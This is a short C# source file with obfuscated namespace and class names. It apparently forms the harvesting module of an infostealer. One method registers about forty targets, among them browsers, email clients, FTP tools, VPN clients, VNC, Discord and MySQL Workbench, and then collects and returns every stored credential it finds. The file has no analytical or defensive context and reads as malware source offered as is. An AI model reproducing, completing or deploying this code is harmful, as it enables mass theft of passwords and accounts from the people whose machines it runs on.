using System;
using System.Collections.Generic;
using C6Zy;

namespace rk937aHHc
{
	public class HzVG56dg3
	{
        public static List<WTitxI2m> GrabCredentialList()
        {
            AH9.InitializeBrowserAndEmail();
            SetupDataLists collector = new SetupDataLists();

            collector.AppendToCredentialList(new Chromium()); 
            collector.AppendToCredentialList(new Firefox()); 
            collector.AppendToCredentialList(new IE_Edge()); 
            collector.AppendToCredentialList(new UC_Browser()); 
            collector.AppendToCredentialList(new Safari_for_Windows()); 
            collector.AppendToCredentialList(new Microsoft_Protects()); 
            collector.AppendToCredentialList(new QQ_Browser()); 
            collector.AppendToCredentialList(new Falkon_Browser()); 
            collector.AppendToCredentialList(new Flock_Browser());
            collector.AppendToCredentialList(new Outlook()); 
            collector.AppendToCredentialList(new Windows_MailApp()); 
            collector.AppendToCredentialList(new The_Bat()); 
            collector.AppendToCredentialList(new Becky()); 
            collector.AppendToCredentialList(new IncrediMail()); 
            collector.AppendToCredentialList(new Eudora()); 
            collector.AppendToCredentialList(new ClawsMail()); 
            collector.AppendToCredentialList(new FoxMail()); 
            collector.AppendToCredentialList(new Opera_Mail()); 
            collector.AppendToCredentialList(new PocoMail()); 
            collector.AppendToCredentialList(new eM_Client()); 
            collector.AppendToCredentialList(new Mailbird()); 
            collector.AppendToCredentialList(new FileZilla()); 
            collector.AppendToCredentialList(new WinSCP()); 
            collector.AppendToCredentialList(new CoreFTP()); 
            collector.AppendToCredentialList(new Flash_FXP()); 
            collector.AppendToCredentialList(new FTP_Navigator()); 
            collector.AppendToCredentialList(new SmartFTP()); 
            collector.AppendToCredentialList(new WS_FTP()); 
            collector.AppendToCredentialList(new FtpCommander()); 
            collector.AppendToCredentialList(new FTPGetter()); 
            collector.AppendToCredentialList(new OpenVPN()); 
            collector.AppendToCredentialList(new NordVPN()); 
            collector.AppendToCredentialList(new Private_InternetAccess()); 
            collector.AppendToCredentialList(new VNC()); 
            collector.AppendToCredentialList(new Discord()); 
            collector.AppendToCredentialList(new Trillian()); 
            collector.AppendToCredentialList(new Psi()); 
            collector.AppendToCredentialList(new MysqlWorkbench()); 
            collector.AppendToCredentialList(new Internet_DownloaderManager()); 
            collector.AppendToCredentialList(new JDownloader()); 

            collector.CollectAllCredentials();

            return collector.CredentialsList_;
        }
    }
}
